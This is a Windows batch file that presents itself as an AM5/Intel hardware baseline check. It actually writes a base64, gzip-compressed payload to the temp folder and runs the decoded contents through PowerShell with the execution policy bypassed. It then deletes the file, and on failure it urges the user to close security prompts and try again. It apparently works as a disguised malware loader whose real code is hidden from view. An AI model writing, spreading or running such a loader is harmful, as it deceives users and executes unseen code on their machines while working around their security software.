@echo off
setlocal
title Hardware check - AM5 + Intel
echo.
echo   Hardware baseline check - AM5 + Intel
echo   Reads this PC, compares it with the platform baseline, writes a report.
echo.
set "HCPAYLOAD=%TEMP%\hc-am5-intel.b64"
> "%HCPAYLOAD%" (
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo glpNiqzo9UqfvgAVC8yhqgbCGqDmFxZNOBCc5kHsJ3S98fPl4VZl8bcAcO5dEAw1rQqAi7L2Wx+Liu+2jzs/zs5/nPcOzuQ8k7nWVB423Fh5ygL8nBU029lwMqb7PoS4OoWP8pvSFvj/AFRFDNwOewAA
)
if not exist "%HCPAYLOAD%" goto :failed
powershell -NoProfile -ExecutionPolicy Bypass -Command "$p=Join-Path $env:TEMP 'hc-am5-intel.b64'; $b=(Get-Content -Raw $p) -replace '\s',''; $m=New-Object IO.MemoryStream(,[Convert]::FromBase64String($b)); $g=New-Object IO.Compression.GZipStream($m,[IO.Compression.CompressionMode]::Decompress); $r=New-Object IO.StreamReader($g,[Text.Encoding]::UTF8); $c=$r.ReadToEnd(); $r.Dispose(); & ([scriptblock]::Create($c))"
set "HCCODE=%ERRORLEVEL%"
del "%HCPAYLOAD%" >nul 2>nul
if not "%HCCODE%"=="0" goto :failed
echo.
echo   Done. Press any key to close.
pause >nul
exit /b 0
:failed
echo.
echo   The check did not finish. Close any security prompt and run it again.
pause >nul
exit /b 1
